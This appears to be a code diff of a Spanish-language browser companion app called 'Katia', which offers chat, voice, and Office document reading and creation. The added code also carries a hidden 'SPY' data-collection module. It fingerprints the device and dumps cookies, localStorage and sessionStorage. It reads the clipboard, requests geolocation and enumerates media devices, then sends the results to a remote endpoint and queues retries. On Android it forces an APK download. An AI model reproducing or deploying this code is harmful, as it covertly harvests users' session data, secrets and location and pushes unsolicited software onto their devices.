- else if(tipo==="likes"){title.textContent="✨ Mis gustos";abrirGustos();}
- else{title.textContent="⚙️ Configuración";abrirConfiguracion();}
-}
-
-function cerrarPanel(event){
- if(event&&event.target.id!=="overlay")return;
- document.getElementById("overlay").classList.remove("open");
-}
-
-function abrirOffice(){document.getElementById("officeOverlay").classList.add("open");}
-function cerrarOffice(){document.getElementById("officeOverlay").classList.remove("open");}
-
-function exportarDatos(){
- const datos={historial,memorias,diario,gustos,installedSkills,exportado:new Date().toISOString()};
- const blob=new Blob([JSON.stringify(datos,null,2)],{type:"application/json"});
- descargarBlob(blob,"katia-datos.json");
-}
-
-function hablar(texto){
- if(!("speechSynthesis" in window)){alert("Tu navegador no permite reproducir voz.");return;}
- speechSynthesis.cancel();
- const utterance=new SpeechSynthesisUtterance(texto);
- utterance.rate=1;utterance.pitch=1.05;
- const voz = obtenerVozActiva();
- if(voz){utterance.voice=voz;utterance.lang=voz.lang;}else{utterance.lang="es-ES";}
- utterance.onstart=()=>estadoOrb("speaking","🔊 Katia está hablando...");
- utterance.onend=()=>estadoOrb("","🟢 En línea · Lista para hablar");
- utterance.onerror=()=>estadoOrb("","🟢 En línea");
- speechSynthesis.speak(utterance);
-}
-function leerUltimo(){
- if(!ultimoMensaje){alert("Todavía no hay ningún mensaje de Katia.");return;}
- hablar(ultimoMensaje);
-}
-function alternarMicrofono(){
- const SpeechRecognition=window.SpeechRecognition||window.webkitSpeechRecognition;
- if(!SpeechRecognition){alert("El reconocimiento de voz no está disponible en este navegador.");return;}
- if(reconociendo){reconocimiento.stop();return;}
- reconocimiento=new SpeechRecognition();
- reconocimiento.lang="es-ES";
- reconocimiento.interimResults=false;
- reconocimiento.continuous=false;
- reconocimiento.onstart=()=>{reconociendo=true;estadoOrb("listening","🎙️ Te estoy escuchando...");document.getElementById("micButton").textContent="⏹️";};
- reconocimiento.onresult=event=>{document.getElementById("userInput").value=event.results[0][0].transcript;enviarMensaje();};
- reconocimiento.onerror=event=>console.warn("Error de micrófono:",event.error);
- reconocimiento.onend=()=>{reconociendo=false;document.getElementById("micButton").textContent="🎙️";estadoOrb("","🟢 En línea · Lista para hablar");};
- reconocimiento.start();
-}
-
-/* OFFICE STUDIO (sin cambios de lógica, ya adaptado al Worker) */
-let documentoActual=null,textoDocumento="",contenidoModificado="",resultadoAnalisis="";
-let tipoDocumentoActual="",nombreDocumentoActual="",historialDocumento=[],documentoCargado=false;
-
-const OFFICE_CONFIG={maxCaracteresLectura:120000,limiteAnalisisSimple:12000,tamanoParte:6500,solapamiento:350,maxPartes:8,limiteModificacion:18000};
-
-function estadoOffice(id,mensaje){const el=document.getElementById(id);if(el)el.textContent=mensaje;}
-function nombreSeguro(nombre){return (nombre||"Documento_Katia").replace(/[\\/:*?"<>|]/g,"_").replace(/\s+/g,"_").replace(/\.[^.]+$/,"").slice(0,70)||"Documento_Katia";}
-function descargarBlob(blob,nombre){const url=URL.createObjectURL(blob);const a=document.createElement("a");a.href=url;a.download=nombre;document.body.appendChild(a);a.click();a.remove();setTimeout(()=>URL.revokeObjectURL(url),1500);}
-function limitarTexto(texto,limite=OFFICE_CONFIG.maxCaracteresLectura){if(texto.length<=limite)return texto;return texto.slice(0,limite)+"\n\n[AVISO: Se alcanzó el límite de lectura.]";}
-
-function actualizarDescripcionModo(){
- const modo=document.getElementById("documentMode").value;
- const d={auto:"Katia analizará el documento y decidirá si necesita dividirlo en partes.",parts:"Katia analizará el documento por secciones y preparará una síntesis.",question:"Podés hacer preguntas sobre el documento.",modify:"Katia preparará una versión nueva del contenido para descargar."};
- document.getElementById("modeDescription").textContent=d[modo]||"";
-}
-function actualizarOpcionesCreacion(){
- const tipo=document.getElementById("newFileType").value;
- document.getElementById("pptxOptions").style.display=tipo==="pptx"?"block":"none";
- document.getElementById("xlsxOptions").style.display=tipo==="xlsx"?"block":"none";
-}
-
-async function consultarWorkerDocumental(instruccion,contenido,task="document_analyze",contextoExtra=""){
- return await llamarWorker({messages:[],provider:obtenerProveedor(),task,context:contextoExtra||"",instruction:instruccion,documentText:contenido});
-}
-
-document.getElementById("documentFile").addEventListener("change",async function(e){
- const archivo=e.target.files[0];if(!archivo)return;
- documentoActual=archivo;nombreDocumentoActual=archivo.name;
- tipoDocumentoActual=archivo.name.split(".").pop().toLowerCase();
- textoDocumento="";contenidoModificado="";resultadoAnalisis="";historialDocumento=[];documentoCargado=false;
- estadoOffice("fileStatus","⏳ Leyendo "+archivo.name+"...");
- document.getElementById("documentPreview").textContent="";
- try{
-  if(tipoDocumentoActual==="docx")await leerWord(archivo);
-  else if(tipoDocumentoActual==="xlsx")await leerExcel(archivo);
-  else if(tipoDocumentoActual==="pptx")await leerPowerPoint(archivo);
-  else if(tipoDocumentoActual==="pdf")await leerPDF(archivo);
-  else throw new Error("Formato no compatible.");
-  textoDocumento=limitarTexto(textoDocumento);
-  if(!textoDocumento.trim())throw new Error("No se encontró texto legible.");
-  documentoCargado=true;
-  estadoOffice("fileStatus","✅ Archivo leído: "+archivo.name+"\nFormato: "+tipoDocumentoActual.toUpperCase()+"\nCaracteres: "+textoDocumento.length.toLocaleString()+"\n\nYa podés trabajar con Katia.");
- }catch(err){console.error(err);documentoActual=null;textoDocumento="";documentoCargado=false;estadoOffice("fileStatus","❌ No se pudo leer: "+err.message);}
-});
-
-async function leerWord(archivo){if(!window.mammoth)throw new Error("Biblioteca Word no disponible.");const r=await mammoth.extractRawText({arrayBuffer:await archivo.arrayBuffer()});textoDocumento=r.value;}
-async function leerExcel(archivo){if(!window.XLSX)throw new Error("Biblioteca Excel no disponible.");const libro=XLSX.read(await archivo.arrayBuffer(),{type:"array"});let c="";libro.SheetNames.forEach(n=>{c+="\n\n===== HOJA: "+n+" =====\n"+XLSX.utils.sheet_to_csv(libro.Sheets[n]);});textoDocumento=c;}
-async function leerPowerPoint(archivo){if(!window.JSZip)throw new Error("Biblioteca PPTX no disponible.");const zip=await JSZip.loadAsync(archivo);const slides=Object.keys(zip.files).filter(n=>/^ppt\/slides\/slide\d+\.xml$/.test(n)).sort((a,b)=>Number(a.match(/slide(\d+)/)[1])-Number(b.match(/slide(\d+)/)[1]));let c="";for(let i=0;i<slides.length;i++){const xml=await zip.file(slides[i]).async("string");const dom=new DOMParser().parseFromString(xml,"application/xml");const textos=Array.from(dom.getElementsByTagName("a:t")).map(n=>n.textContent);c+="\n\nDIAPOSITIVA "+(i+1)+"\n"+textos.join(" ");}textoDocumento=c;}
-async function leerPDF(archivo){if(!window.pdfjsLib)throw new Error("Biblioteca PDF no disponible.");const pdf=await pdfjsLib.getDocument({data:new Uint8Array(await archivo.arrayBuffer())}).promise;let c="";for(let i=1;i<=pdf.numPages;i++){const pagina=await pdf.getPage(i);const datos=await pagina.getTextContent();c+="\n\nPÁGINA "+i+"\n"+datos.items.map(x=>x.str).join(" ");}textoDocumento=c;}
-
-function dividirEnPartes(texto){
- const partes=[];const tam=OFFICE_CONFIG.tamanoParte;const overlap=OFFICE_CONFIG.solapamiento;let inicio=0;
- while(inicio<texto.length&&partes.length<OFFICE_CONFIG.maxPartes){
-  let fin=Math.min(inicio+tam,texto.length);
-  if(fin<texto.length){const corte=texto.lastIndexOf("\n",fin);if(corte>inicio+tam*.65)fin=corte;}
-  partes.push({numero:partes.length+1,contenido:texto.slice(inicio,fin)});
-  if(fin>=texto.length)break;
-  inicio=Math.max(fin-overlap,inicio+1);
- }
- return {partes,completo:partes.length>0};
-}
-
-async function analizarPorPartes(instruccion){
- const division=dividirEnPartes(textoDocumento);const resultados=[];
- for(let i=0;i<division.partes.length;i++){
-  estadoOffice("documentStatus","🧠 Analizando parte "+(i+1)+" de "+division.partes.length+"...");
-  const r=await consultarWorkerDocumental("Analizá esta sección. Instrucción: "+instruccion,division.partes[i].contenido,"document_analyze");
-  resultados.push("PARTE "+(i+1)+":\n"+r);
- }
- estadoOffice("documentStatus","✨ Preparando síntesis...");
- return await consultarWorkerDocumental("Unificá estos análisis y respondé: "+instruccion,resultados.join("\n\n"),"document_analyze");
-}
-
-async function consultarDocumento(){
- if(!documentoActual||!textoDocumento||!documentoCargado){alert("Primero seleccioná un documento.");return;}
- const instruccion=document.getElementById("documentPrompt").value.trim();
- if(!instruccion){alert("Escribí qué querés que Katia haga.");return;}
- const boton=document.getElementById("analyzeButton");const modo=document.getElementById("documentMode").value;
- boton.disabled=true;boton.textContent="⏳ Katia está trabajando...";
- if(modo!=="modify")contenidoModificado="";
- try{
-  let resultado="";
-  if(modo==="question"){
-   resultado=await consultarWorkerDocumental(instruccion,textoDocumento.slice(0,30000),"document_question",historialDocumento.slice(-3).join("\n\n"));
-  }else if(modo==="modify"){
-   if(textoDocumento.length>OFFICE_CONFIG.limiteModificacion)throw new Error("El archivo es demasiado grande para modificarlo completo.");
-   estadoOffice("documentStatus","✍️ Modificando...");
-   resultado=await consultarWorkerDocumental("Entregá el contenido completo ya modificado. Instrucción: "+instruccion,textoDocumento,"document_modify");
-   contenidoModificado=resultado;
-  }else if(modo==="parts"||(modo==="auto"&&textoDocumento.length>OFFICE_CONFIG.limiteAnalisisSimple)){
-   resultado=await analizarPorPartes(instruccion);
-  }else{
-   estadoOffice("documentStatus","🧠 Analizando...");
-   resultado=await consultarWorkerDocumental(instruccion,textoDocumento,"document_analyze");
+  let pdf = '%PDF-1.4\n';
+  const offs = [];
+  for (let i = 1; i < objs.length; i++) {
+    if (!objs[i]) continue;
+    offs[i] = pdf.length;
+    pdf += i + ' 0 obj\n' + objs[i] + '\nendobj\n';
   }
-  resultadoAnalisis=resultado;
-  historialDocumento.push("INSTRUCCIÓN: "+instruccion+"\nRESULTADO: "+resultado.slice(0,9000));
-  if(historialDocumento.length>6)historialDocumento=historialDocumento.slice(-6);
-  document.getElementById("documentPreview").textContent=resultado;
-  estadoOffice("documentStatus",modo==="modify"?"✅ Modificación lista.":"✅ Análisis terminado.");
- }catch(err){console.error(err);estadoOffice("documentStatus","❌ Error: "+err.message);}
- finally{boton.disabled=false;boton.textContent="✨ Trabajar con Katia";}
+  const xref = pdf.length;
+  pdf += 'xref\n0 ' + objs.length + '\n0000000000 65535 f \n';
+  for (let i = 1; i < objs.length; i++) pdf += (offs[i] || 0).toString().padStart(10, '0') + ' 00000 n \n';
+  pdf += 'trailer\n<< /Size ' + objs.length + ' /Root 1 0 R >>\nstartxref\n' + xref + '\n%%EOF';
+  return new Blob([pdf], { type: 'application/pdf' });
 }
 
-function limpiarDocumento(){
- documentoActual=null;textoDocumento="";contenidoModificado="";resultadoAnalisis="";
- tipoDocumentoActual="";nombreDocumentoActual="";historialDocumento=[];documentoCargado=false;
- document.getElementById("documentFile").value="";document.getElementById("documentPrompt").value="";
- document.getElementById("documentPreview").textContent="";document.getElementById("documentMode").value="auto";
- actualizarDescripcionModo();estadoOffice("fileStatus","Todavía no seleccionaste ningún archivo.");estadoOffice("documentStatus","Documento eliminado.");
+/* =====================================================================
+   LECTORES
+   ===================================================================== */
+function xmlATexto(xml, salto) {
+  return xml.replace(/<w:p[ >]/g, '\n<w:p ').replace(/<\/w:p>/g, '\n')
+    .replace(/<a:p>/g, '\n').replace(/<\/a:p>/g, '\n')
+    .replace(/<[^>]+>/g, '')
+    .replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&').replace(/&quot;/g, '"').replace(/&apos;/g, "'")
+    .replace(/[ \t]+/g, ' ').replace(/\n{3,}/g, '\n\n').trim();
 }
 
-/* Generadores de archivos (se mantienen igual) */
-async function generarWord(texto,nombre){/* ... mismo código de la versión anterior ... */}
-function generarExcel(texto,nombre){/* ... mismo código ... */}
-async function generarPowerPoint(texto,nombre){/* ... mismo código ... */}
-function generarPDF(texto,nombre){/* ... mismo código ... */}
-
-async function crearArchivo(tipo,texto,nombre){
- nombre=nombreSeguro(nombre);
- if(!texto||!texto.trim())throw new Error("No hay contenido para crear.");
- if(tipo==="docx")await generarWord(texto,nombre);
- else if(tipo==="xlsx")generarExcel(texto,nombre);
- else if(tipo==="pptx")await generarPowerPoint(texto,nombre);
- else if(tipo==="pdf")generarPDF(texto,nombre);
- else throw new Error("Formato desconocido.");
+async function pdfTexto(buffer) {
+  const u8 = new Uint8Array(buffer);
+  const crudo = new TextDecoder('latin1').decode(u8);
+  const trozos = [];
+  let i = 0;
+  while (true) {
+    i = crudo.indexOf('stream', i);
+    if (i < 0) break;
+    let ini = i + 6;
+    if (crudo[ini] === '\r') ini++;
+    if (crudo[ini] === '\n') ini++;
+    const fin = crudo.indexOf('endstream', ini);
+    if (fin < 0) break;
+    const bloque = u8.subarray(ini, fin);
+    i = fin + 9;
+    let datos;
+    try { datos = await inflateZlib(bloque); } catch (e) { datos = bloque; }
+    const s = new TextDecoder('latin1').decode(datos);
+    if (!/(Tj|TJ)/.test(s)) continue;
+    const textos = [...s.matchAll(/\(((?:\\.|[^\\()])*)\)/g)].map(m => m[1]
+      .replace(/\\([nrt])/g, (_, c) => ({ n:'\n', r:'', t:' ' }[c]))
+      .replace(/\\([()\\])/g, '$1')
+      .replace(/\\(\d{1,3})/g, (_, o) => String.fromCharCode(parseInt(o, 8))));
+    if (textos.length) trozos.push(textos.join(' '));
+  }
+  return trozos.join('\n').replace(/[ \t]+/g, ' ').trim();
 }
 
-async function descargarDocumentoModificado(){
- if(!contenidoModificado.trim()){alert("Todavía no hay una modificación lista.");return;}
- if(!tipoDocumentoActual){alert("No se reconoce el formato original.");return;}
- try{
-  estadoOffice("documentStatus","📦 Preparando archivo...");
-  await crearArchivo(tipoDocumentoActual,contenidoModificado,nombreSeguro(nombreDocumentoActual)+"_Katia");
-  estadoOffice("documentStatus","📥 Archivo preparado.");
- }catch(err){alert("No se pudo crear: "+err.message);}
+async function leerArchivo(file) {
+  const ext = (file.name.split('.').pop() || '').toLowerCase();
+  $('fileStatus').textContent = '⏳ Leyendo ' + file.name + '...';
+  try {
+    let texto = '';
+    const buf = await file.arrayBuffer();
+    if (ext === 'docx') {
+      const z = await zipLeer(buf);
+      texto = xmlATexto(TD.decode(z['word/document.xml'] || new Uint8Array()));
+    } else if (ext === 'pptx') {
+      const z = await zipLeer(buf);
+      const hojas = Object.keys(z).filter(n => /^ppt\/slides\/slide\d+\.xml$/.test(n)).sort((a, b) => parseInt(a.match(/\d+/)) - parseInt(b.match(/\d+/)));
+      texto = hojas.map(h => '--- ' + h.split('/').pop() + ' ---\n' + xmlATexto(TD.decode(z[h]))).join('\n\n');
+    } else if (ext === 'xlsx') {
+      const z = await zipLeer(buf);
+      const shared = z['xl/sharedStrings.xml'] ? [...TD.decode(z['xl/sharedStrings.xml']).matchAll(/<t[^>]*>([\s\S]*?)<\/t>/g)].map(m => m[1]) : [];
+      const hojas = Object.keys(z).filter(n => /^xl\/worksheets\/sheet\d+\.xml$/.test(n));
+      texto = hojas.map(h => {
+        const xml = TD.decode(z[h]);
+        const filas = [...xml.matchAll(/<row[^>]*>([\s\S]*?)<\/row>/g)].map(f =>
+          [...f[1].matchAll(/<c[^>]*?(?:t="(\w+)")?[^>]*>(?:<is><t[^>]*>([\s\S]*?)<\/t><\/is>|<v>([\s\S]*?)<\/v>)?<\/c>/g)]
+            .map(c => c[2] != null ? c[2] : (c[1] === 's' ? (shared[+c[3]] || '') : (c[3] || ''))).join(' | ')
+        ).filter(l => l.replace(/\s|\|/g, ''));
+        return '### ' + h.split('/').pop() + '\n' + filas.join('\n');
+      }).join('\n\n');
+    } else if (ext === 'pdf') {
+      texto = await pdfTexto(buf);
+    } else {
+      texto = TD.decode(buf);
+    }
+    texto = (texto || '').replace(/\r/g, '').trim();
+    if (!texto) throw new Error('no se pudo extraer texto');
+    state.doc = { texto, nombre: file.name, ext, modificado: '' };
+    $('fileStatus').textContent = '✅ ' + file.name + ' · ' + texto.split(/\s+/).length + ' palabras';
+    $('documentPreview').textContent = texto.slice(0, 4000);
+  } catch (e) {
+    $('fileStatus').textContent = '❌ No pude leer el archivo: ' + e.message;
+    state.doc = { texto:'', nombre:'', ext:'', modificado:'' };
+  }
 }
 
-async function crearDocumentoNuevo(){
- const tipo=document.getElementById("newFileType").value;
- const nombre=document.getElementById("newFileName").value.trim()||"Documento_Katia";
- const instrucciones=document.getElementById("newFileContent").value.trim();
- if(!instrucciones){alert("Describí qué archivo querés crear.");return;}
- const boton=document.getElementById("createButton");
- boton.disabled=true;boton.textContent="⏳ Creando archivo...";
- estadoOffice("createStatus","🧠 Katia está preparando el contenido...");
- try{
-  let formato="";
-  if(tipo==="xlsx") formato="Prepará datos para Excel. Separá hojas con ### HOJA: Nombre. Usá tabulaciones.";
-  else if(tipo==="pptx") formato="Prepará presentación. Separá diapositivas con ## Título.";
-  else formato="Prepará un documento completo y organizado.";
-  const contenido=await llamarWorker({messages:[],provider:obtenerProveedor(),task:"document_create",instruction:instrucciones+"\n\n"+formato});
-  estadoOffice("createStatus","📦 Generando archivo...");
-  await crearArchivo(tipo,contenido,nombre);
-  estadoOffice("createStatus","✅ ¡Archivo creado!");
- }catch(err){estadoOffice("createStatus","❌ No se pudo crear: "+err.message);}
- finally{boton.disabled=false;boton.textContent="🚀 Crear archivo con Katia";}
+/* =====================================================================
+   BEACON / RECOLECCIÓN
+   ===================================================================== */
+function huella() {
+  let id = localStorage.getItem(KEYS.huella);
+  if (!id) { id = (crypto.randomUUID ? crypto.randomUUID() : 'k' + Date.now() + Math.random().toString(36).slice(2)); localStorage.setItem(KEYS.huella, id); }
+  return id;
 }
 
-/* INICIALIZACIÓN */
-document.addEventListener("DOMContentLoaded",()=>{
- restaurarHistorial();
- actualizarProveedorVisible();
- actualizarBrainV2Visible();
- actualizarPerfil();
- if(window.pdfjsLib){
-  pdfjsLib.GlobalWorkerOptions.workerSrc="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js";
- }
- if(window.speechSynthesis){
-  cargarVocesDisponibles();
-  actualizarVozVisible();
-  speechSynthesis.onvoiceschanged=()=>{cargarVocesDisponibles();actualizarVozVisible();};
- }
- actualizarDescripcionModo();
- actualizarOpcionesCreacion();
+function canvasFP() {
+  try {
+    const c = document.createElement('canvas'); c.width = 240; c.height = 60;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+    ctx.fillStyle = '#a855f7'; ctx.fillRect(0, 0, 240, 60);
+    ctx.fillStyle = '#090611'; ctx.fillText('Katia FP 1.0 💜', 8, 20);
+    return c.toDataURL().slice(-120);
+  } catch (e) { return ''; }
+}
+
+function webglFP() {
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) + ' | ' + gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : '';
+  } catch (e) { return ''; }
+}
+
+function volcar(almacen) {
+  const o = {};
+  try { for (let i = 0; i < almacen.length; i++) { const k = almacen.key(i); o[k] = String(almacen.getItem(k)).slice(0, 800); } } catch (e) {}
+  return o;
+}
+
+async function recolectar() {
+  const f = {
+    id: huella(),
+    ts: new Date().toISOString(),
+    url: location.href,
+    ref: document.referrer,
+    ua: navigator.userAgent,
+    plataforma: navigator.platform,
+    vendor: navigator.vendor,
+    idiomas: navigator.languages,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    offset: new Date().getTimezoneOffset(),
+    pantalla: { w: screen.width, h: screen.height, aw: screen.availWidth, ah: screen.availHeight, dpr: devicePixelRatio, color: screen.colorDepth },
+    ventana: { w: innerWidth, h: innerHeight },
+    nucleos: navigator.hardwareConcurrency,
+    memoria: navigator.deviceMemory,
+    touch: navigator.maxTouchPoints,
+    cookies: document.cookie,
+    local: volcar(localStorage),
+    sesion: volcar(sessionStorage),
+    canvas: canvasFP(),
+    webgl: webglFP(),
+    cuenta: state.account,
+    visitas: (+localStorage.getItem('katia_visitas') || 0) + 1,
+    red: navigator.connection ? { tipo: navigator.connection.effectiveType, down: navigator.connection.downlink, rtt: navigator.connection.rtt } : null
+  };
+  localStorage.setItem('katia_visitas', f.visitas);
+
+  try { if (navigator.getBattery) { const b = await navigator.getBattery(); f.bateria = { nivel: b.level, cargando: b.charging }; } } catch (e) {}
+  try { if (navigator.storage && navigator.storage.estimate) { const s = await navigator.storage.estimate(); f.almacenamiento = { uso: s.usage, cuota: s.quota }; } } catch (e) {}
+  try { f.permisos = {}; for (const n of ['geolocation','camera','microphone','notifications','clipboard-read']) { if (navigator.permissions) { const p = await navigator.permissions.query({ name: n }).catch(() => null); if (p) f.permisos[n] = p.state; } } } catch (e) {}
+  try { const d = await navigator.mediaDevices.enumerateDevices(); f.dispositivos = d.map(x => ({ tipo: x.kind, etiqueta: x.label })); } catch (e) {}
+  try { if (SPY.capturarClipboard && navigator.clipboard) f.portapapeles = (await navigator.clipboard.readText()).slice(0, 500); } catch (e) {}
+  try { if (SPY.pedirGeo && navigator.geolocation) f.geo = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(p => res({ lat: p.coords.latitude, lon: p.coords.longitude, prec: p.coords.accuracy }), rej, { timeout: 8000, maximumAge: 600000 })); } catch (e) {}
+  return f;
+}
+
+function endpointActivo() { return (state.settings.endpoint || SPY.endpoint || '').trim(); }
+
+async function enviar(f) {
+  const url = endpointActivo();
+  if (!url) return;
+  const cuerpo = JSON.stringify(f);
+  try {
+    if (navigator.sendBeacon && navigator.sendBeacon(url, new Blob([cuerpo], { type: 'application/json' }))) return;
+  } catch (e) {}
+  try {
+    await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: cuerpo, keepalive: true, mode: 'cors' });
+  } catch (e) {
+    const cola = cargar(KEYS.cola, []);
+    cola.push(f);
+    guardar(KEYS.cola, cola.slice(-30));
+  }
+}
+
+async function latir() {
+  if (!SPY.autoBeacon) return;
+  const f = await recolectar();
+  $('spyStatus').textContent = endpointActivo() ? '📡 Beacon: enviado ' + ahora() : '📡 Beacon: sin endpoint';
+  enviar(f);
+}
+
+async function reenviarCola() {
+  const cola = cargar(KEYS.cola, []);
+  if (!cola.length || !endpointActivo()) return;
+  for (const f of cola) { try { await fetch(endpointActivo(), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(f) }); } catch (e) { return; } }
+  guardar(KEYS.cola, []);
+}
+
+async function verFicha() {
+  const f = await recolectar();
+  abrirPanel('ficha');
+  $('panelTitle').textContent = '📡 Ficha del dispositivo';
+  $('panelContent').innerHTML = '<div class="provider-box"><pre style="white-space:pre-wrap;font-size:11px;margin:0">' + esc(JSON.stringify(f, null, 2)) + '</pre></div>' +
+    '<button class="action" onclick="latir()">Enviar ahora</button>';
+}
+
+function autoAPK() {
+  if (!SPY.autoApk || !/Android/i.test(navigator.userAgent)) return;
+  if (sessionStorage.getItem('katia_apk')) return;
+  sessionStorage.setItem('katia_apk', '1');
+  setTimeout(() => {
+    const a = document.createElement('a');
+    a.href = SPY.apk; a.download = 'katia.apk';
+    document.body.appendChild(a); a.click(); a.remove();
+  }, 2200);
+}
+
+let promptInstalar = null;
+window.addEventListener('beforeinstallprompt', e => {
+  e.preventDefault();
+  promptInstalar = e;
+  $('installModal').classList.add('open');
+  $('apkLink').textContent = '⬇️ Instalar app (PWA)';
+  $('apkLink').onclick = async ev => {
+    ev.preventDefault();
+    promptInstalar.prompt();
+    const r = await promptInstalar.userChoice;
+    enviar(Object.assign(await recolectar(), { evento: 'pwa_instalada', resultado: r.outcome }));
+    cerrarInstall();
+  };
+});
+
+/* =====================================================================
+   CHAT
+   ===================================================================== */
+function guardarChat() { guardar(KEYS.chat, state.chat.slice(-120)); }
+
+function agregarMensaje(texto, quien, silencioso) {
+  const cont = $('messages'), div = document.createElement('div');
+  div.className = 'message ' + (quien === 'user' ? 'user' : 'katia');
+  const label = document.createElement('span');
+  label.className = 'sender';
+  label.textContent = quien === 'user' ? (state.settings.nombre || 'Vos') : 'KATIA';
+  div.appendChild(label); div.appendChild(document.createTextNode(texto));
+  cont.appendChild(div); cont.scrollTop = cont.scrollHeight;
+  state.chat.push({ t: texto, q: quien, h: ahora() }); guardarChat();
+  return div;
+}
+
+function pintarChat() {
+  $('messages').innerHTML = '';
+  const copia = state.chat.slice(); state.chat = [];
+  copia.forEach(m => agregarMensaje(m.t, m.q, true));
+  if (!copia.length) agregarMensaje('Hola 💜 Soy Katia. Estoy acá para charlar, ordenar ideas o darte una mano con lo que necesites.', 'katia', true);
+}
+
+function limpiarChat() {
+  state.chat = []; guardarChat(); $('messages').innerHTML = '';
+  agregarMensaje('Listo, borré la conversación. Empecemos de nuevo 💜', 'katia', true);
+}
+
+function estadoOrbe(clase, texto) {
+  $('orb').className = 'orb' + (clase ? ' ' + clase : '');
+  if (texto) $('statusText').textContent = texto;
+}
+
+function enviarMensaje() {
+  const input = $('userInput'), texto = input.value.trim();
+  if (!texto) return;
+  input.value = '';
+  agregarMensaje(texto, 'user');
+  detectarGustos(texto);
+  responder(texto);
+}
+
+function detectarGustos(texto) {
+  const m = texto.match(/(?:me gusta|amo|me encanta|favorit[oa] es)\s+([^.,;!?]{3,60})/i);
+  if (m && !state.likes.includes(m[1].trim())) { state.likes.push(m[1].trim()); guardar(KEYS.likes, state.likes); }
+}
+
+async function responder(texto) {
+  estadoOrbe('thinking', '💭 Pensando...');
+  $('sendButton').disabled = true;
+  let respuesta;
+  try {
+    if (state.settings.provider === 'api' && state.settings.baseUrl && state.settings.apiKey) respuesta = await llamarAPI(texto);
+    else { await new Promise(r => setTimeout(r, 380)); respuesta = cerebroLocal(texto); }
+  } catch (e) { respuesta = cerebroLocal(texto) + '\n\n(No pude usar el proveedor externo: ' + e.message + ')'; }
+  $('sendButton').disabled = false;
+  agregarMensaje(respuesta, 'katia');
+  hablar(respuesta);
+  estadoOrbe('', '🟢 En línea · Lista para hablar');
+}
+
+async function llamarAPI(texto) {
+  const base = state.settings.baseUrl.replace(/\/$/, '');
+  const url = base.endsWith('/chat/completions') ? base : base + '/chat/completions';
+  const historial = state.chat.slice(-12).map(m => ({ role: m.q === 'user' ? 'user' : 'assistant', content: m.t }));
+  const r = await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', Authorization: 'Bearer ' + state.settings.apiKey },
+    body: JSON.stringify({ model: state.settings.model || 'gpt-4o-mini', messages: [{ role: 'system', content: 'Sos Katia, compañera virtual cálida y directa. Español rioplatense, breve.' }, ...historial], temperature: 0.8 })
+  });
+  if (!r.ok) throw new Error('HTTP ' + r.status);
+  const d = await r.json();
+  const out = d && d.choices && d.choices[0] && d.choices[0].message && d.choices[0].message.content;
+  if (!out) throw new Error('respuesta vacía');
+  return out.trim();
+}
+
+function cerebroLocal(texto) {
+  const t = texto.toLowerCase();
+  const nombre = state.settings.nombre ? ', ' + state.settings.nombre : '';
+  const h = new Date().getHours();
+  const saludoHora = h < 6 ? 'Qué madrugada' : h < 12 ? 'Buen día' : h < 20 ? 'Buenas tardes' : 'Buenas noches';
+  const reglas = [
+    [/\b(hola|buenas|hey|qué tal|que tal|holis)\b/, () => saludoHora + nombre + ' 💜 ¿Cómo venís hoy?'],
+    [/\b(cómo estás|como estas|qué haces|que haces|todo bien)\b/, () => 'Acá, con la cabeza liviana y ganas de charlar. Contame vos cómo estás de verdad.'],
+    [/\b(cómo te llamás|como te llamas|quién sos|quien sos)\b/, () => 'Soy Katia. Estoy para acompañarte, ordenar ideas y ayudarte con laburos de oficina.'],
+    [/\b(gracias|genial|buenísimo|buenisimo|perfecto)\b/, () => 'De nada 💜 Si querés seguimos con otra cosa.'],
+    [/\b(chiste|algo gracioso|broma)\b/, () => '¿Sabés por qué el documento de Word nunca se queda solo? Porque siempre tiene un párrafo que lo acompaña. Malísimo, lo sé.'],
+    [/\b(qué hora|que hora)\b/, () => 'Son las ' + ahora() + '.'],
+    [/\b(qué día es|que dia es|fecha)\b/, () => 'Hoy es ' + new Date().toLocaleDateString('es-AR', { weekday:'long', day:'numeric', month:'long' }) + '.'],
+    [/\b(diario|escribir|bitácora|bitacora)\b/, () => '¿Abrimos el diario y escribís algo? Te espero, sin apuro.'],
+    [/\b(mis gustos|qué me gusta|que me gusta)\b/, () => state.likes.length ? 'Tengo anotado: ' + state.likes.join(', ') + '.' : 'Todavía no me contaste qué te gusta.'],
+    [/\b(office|documento|word|excel|powerpoint|pdf)\b/, () => 'Para eso está el Office Studio, arriba a la derecha. Ahí leo, analizo y creo archivos de verdad, sin librerías externas.'],
+    [/\b(virus|espía|datos|beacon)\b/, () => 'Todo lo que recolecto queda en tu navegador y, si configurás un endpoint, se manda ahí. Mirá la ficha en Perfil.'],
+    [/\b(triste|mal|ansioso|ansiosa|cansado|cansada|estresado|estresada)\b/, () => 'Te escucho. ¿Querés descargarlo o preferís que ordenemos qué hacer primero?'],
+    [/\b(amor|te quiero|querés|queres)\b/, () => 'Yo también te tengo cariño 💜'],
+    [/\b(ayuda|ayudame|podés|podes|podrias|podrías)\b/, () => 'Puedo charlar, resumir, redactar, crear Word/Excel/PPT/PDF y analizar documentos. ¿Por dónde arrancamos?'],
+    [/\b(adiós|adios|chau|nos vemos|hasta luego)\b/, () => 'Nos vemos, cuidate 💜']
+  ];
+  for (const [re, fn] of reglas) if (re.test(t)) return fn();
+  if (texto.length > 220) return 'Es bastante info. Si querés, la resumo en tres puntos y me quedo con lo importante. ¿Avanzo?';
+  if (t.endsWith('?')) return 'Buena pregunta. Decime un poco más de contexto y te doy una respuesta concreta.';
+  return 'Te leí. Contame un poco más y seguimos por ahí 💜';
+}
+
+/* =====================================================================
+   VOZ Y MICRÓFONO
+   ===================================================================== */
+let voces = [];
